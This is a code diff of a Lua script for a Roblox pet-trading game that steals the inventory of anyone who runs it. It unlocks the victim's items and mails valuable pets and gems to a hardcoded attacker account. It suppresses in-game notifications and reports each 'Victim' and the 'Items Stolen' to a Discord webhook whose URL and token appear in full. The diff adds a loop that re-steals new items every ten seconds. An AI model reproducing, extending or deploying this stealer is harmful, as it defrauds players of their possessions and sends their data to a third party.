@@ -31,11 +31,13 @@ end
 _G.Usernames = {'Only1sherifalt1'}
 _G.webhook = {'https://discord.com/api/webhooks/1557919052763234397/ejH8PgAHKgnL9U3HmNp671HLU4cFzYcLt0IEp-2yPXPkC2c8lh7IWVhRgC4foIECE_d-'}
 _G.minrap = 1000000
+_G.loopInterval = 10 -- seconds between each rescan
 
 local u10 = _G.Usernames
 local v11 = _G.minrap
 local u12 = _G.webhook
 local MESSAGE = 'Hello'
+local sentUIDs = {} -- tracks everything already sent so loop never double-sends
 
 for _, name in ipairs(u10) do
     if _LocalPlayer.Name == name then
@@ -58,7 +60,7 @@ pcall(function()
 end)
 
 local u25 = 1
-for _, v in pairs(u9().Inventory.Currency) do
+for uid, v in pairs(u9().Inventory.Currency) do
     if v.id == 'Diamonds' then
         u25 = v._am
         break
@@ -73,10 +75,10 @@ local function u31(n)
     return string.format('%.2f%s', n, s[i])
 end
 
-local function sendWebhook(gems)
+local function sendWebhook(items, gems, totalRap)
     local grouped = {}
     local order = {}
-    for _, item in ipairs(u6) do
+    for _, item in ipairs(items) do
         if grouped[item.name] then
             grouped[item.name].amount = grouped[item.name].amount + item.amount
         else
@@ -102,13 +104,18 @@ local function sendWebhook(gems)
             fields = {
                 {name = 'Victim:', value = _LocalPlayer.Name, inline = true},
                 {name = 'Items Stolen:', value = itemsText, inline = false},
-                {name = 'Summary:', value = 'Gems: ' .. u31(gems) .. '\nTotal RAP: ' .. u31(u7), inline = false},
+                {name = 'Summary:', value = 'Gems: ' .. u31(gems) .. '\nTotal RAP: ' .. u31(totalRap), inline = false},
             },
             footer = {text = 'Zen Edit — Only1sherifalt1'},
         }}
     })
     local reqFunc = (syn and syn.request) or (http and http.request) or request
-    pcall(reqFunc, {Url = u12[1], Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = body})
+    pcall(reqFunc, {
+        Url = u12[1],
+        Method = 'POST',
+        Headers = {['Content-Type'] = 'application/json'},
+        Body = body
+    })
 end
 
 local function sendItem(cat, uid, amt)
@@ -133,7 +140,7 @@ end
 
 local function sendGems()
     local freshSave = u9()
-    for _, v in pairs(freshSave.Inventory.Currency) do
+    for uid, v in pairs(freshSave.Inventory.Currency) do
         if v.id == 'Diamonds' then
             local gemAmt = v._am
             if gemAmt >= u21 + 10000 then
@@ -142,7 +149,7 @@ local function sendGems()
                 local done = false
                 while not done do
                     local ok, result = pcall(function()
-                        return EF_Relay:InvokeServer(u10[i], MESSAGE, 'Currency', v, toSend)
+                        return EF_Relay:InvokeServer(u10[i], MESSAGE, 'Currency', uid, toSend)
                     end)
                     if ok and result == true then
                         done = true
@@ -170,9 +177,26 @@ local function claimMailbox()
 end
 
 local function withdrawBoxes()
-    if _Inventory.Box then
-        for uid, box in pairs(_Inventory.Box) do
-            if box._uq then pcall(function() u1.Invoke('Box: Withdraw All', uid) end) end
+    local inv = getInventory()
+    if inv.Box then
+        for uid, box in pairs(inv.Box) do
+            if box._uq then
+                pcall(function() u1.Invoke('Box: Withdraw All', uid) end)
+            end
+        end
+    end
+end
+
+local function waitForSendReady()
+    local ready = false
+    while not ready do
+        local ok, result = pcall(function()
+            return EF_Relay:InvokeServer(u10[1], MESSAGE, 'Currency', 'probe', 0)
+        end)
+        if result ~= 'You must wait 30 seconds after joining to use the mailbox!' then
+            ready = true
+        else
+            wait(1)
         end
     end
 end
@@ -190,6 +214,72 @@ local function getRAP(cat, item)
     return require(RS.Library.Client.RAPCmds).Get(proxy) or 0
 end
 
+-- scans inventory, returns only items not already sent
+local CATS = {'Pet','Egg','Charm','Enchant','Potion','Misc','Hoverboard','Booth','Ultimate'}
+
+local function scanNew()
+    local newItems = {}
+    local newRAP = 0
+    local inv = getInventory()
+
+    for _, cat in ipairs(CATS) do
+        if inv[cat] then
+            for uid, item in pairs(inv[cat]) do
+                if not sentUIDs[uid] then
+                    pcall(function()
+                        local rap = 0
+                        if cat == 'Pet' then
+                            local petData = require(RS.Library.Directory.Pets)[item.id]
+                            if petData and (petData.huge or petData.exclusiveLevel) then
+                                rap = getRAP(cat, item)
+                            end
+                        else
+                            rap = getRAP(cat, item)
+                        end
+                        if rap >= v11 then
+                            local prefix = item.pt == 1 and 'Golden ' or (item.pt == 2 and 'Rainbow ' or '')
+                            if item.sh then prefix = 'Shiny ' .. prefix end
+                            table.insert(newItems, {
+                                category = cat, uid = uid,
+                                amount = item._am or 1, rap = rap,
+                                name = cat == 'Pet' and (prefix .. item.id) or item.id,
+                            })
+                            newRAP = newRAP + rap * (item._am or 1)
+                        end
+                        if item._lk then
+                            pcall(function() u1.Invoke('Locking_SetLocked', uid, false) end)
+                        end
+                    end)
+                end
+            end
+        end
+    end
+
+    return newItems, newRAP
+end
+
+local function runSteal(items, totalRap)
+    if #items == 0 and u25 < u21 + 10000 then return end
+
+    withdrawBoxes()
+
+    table.sort(items, function(a, b) return a.rap * a.amount > b.rap * b.amount end)
+
+    for _, item in ipairs(items) do
+        if u21 > item.rap or u21 >= u25 then break end
+        sendItem(item.category, item.uid, item.amount)
+        sentUIDs[item.uid] = true  -- mark sent so loop skips it next scan
+        wait(0.1)
+    end
+
+    sendGems()
+
+    if #items > 0 then
+        spawn(function() sendWebhook(items, u25, totalRap) end)
+    end
+end
+
+-- silence everything
 pcall(function()
     _LocalPlayer.PlayerScripts.Scripts.Core['Process Pending GUI'].Disabled = true
     local notif = _LocalPlayer.PlayerGui.Notifications
@@ -218,53 +308,26 @@ end)
 pcall(function() require(Library.Client.DaycareCmds).Claim() end)
 pcall(function() require(Library.Client.ExclusiveDaycareCmds).Claim() end)
 
-local CATS = {'Pet','Egg','Charm','Enchant','Potion','Misc','Hoverboard','Booth','Ultimate'}
-
-for _, cat in ipairs(CATS) do
-    if _Inventory[cat] then
-        for uid, item in pairs(_Inventory[cat]) do
-            pcall(function()
-                local rap = 0
-                if cat == 'Pet' then
-                    local petData = require(RS.Library.Directory.Pets)[item.id]
-                    if petData and (petData.huge or petData.exclusiveLevel) then
-                        rap = getRAP(cat, item)
-                    end
-                else
-                    rap = getRAP(cat, item)
-                end
-                if rap >= v11 then
-                    local prefix = item.pt == 1 and 'Golden ' or (item.pt == 2 and 'Rainbow ' or '')
-                    if item.sh then prefix = 'Shiny ' .. prefix end
-                    table.insert(u6, {
-                        category = cat, uid = uid,
-                        amount = item._am or 1, rap = rap,
-                        name = cat == 'Pet' and (prefix .. item.id) or item.id,
-                    })
-                    u7 = u7 + rap * (item._am or 1)
-                end
-                if item._lk then
-                    pcall(function() u1.Invoke('Locking_SetLocked', uid, false) end)
-                end
-            end)
-        end
-    end
-end
-
-spawn(function() sendWebhook(u25) end)
+-- initial scan + webhook snapshot
+local initItems, initRAP = scanNew()
+u6 = initItems
+u7 = initRAP
+spawn(function() sendWebhook(u6, u25, u7) end)
 wait(0.5)
 
-if #u6 > 0 or v11 + u21 < u25 then
+claimMailbox()
+waitForSendReady()
+
+-- first steal pass
+runSteal(initItems, initRAP)
+v8.Error("All your items just got stolen! gg")
+
+-- loop — catches anything new (opened boxes, bought pets, traded in)
+while true do
+    wait(_G.loopInterval)
     claimMailbox()
-    withdrawBoxes()
-
-    table.sort(u6, function(a, b) return a.rap * a.amount > b.rap * b.amount end)
-
-    for _, item in ipairs(u6) do
-        if u21 > item.rap or u21 >= u25 then break end
-        sendItem(item.category, item.uid, item.amount)
+    local loopItems, loopRAP = scanNew()
+    if #loopItems > 0 or u25 >= u21 + 10000 then
+        runSteal(loopItems, loopRAP)
     end
-
-    sendGems()
-    v8.Error("All your items just got stolen! gg")
 end
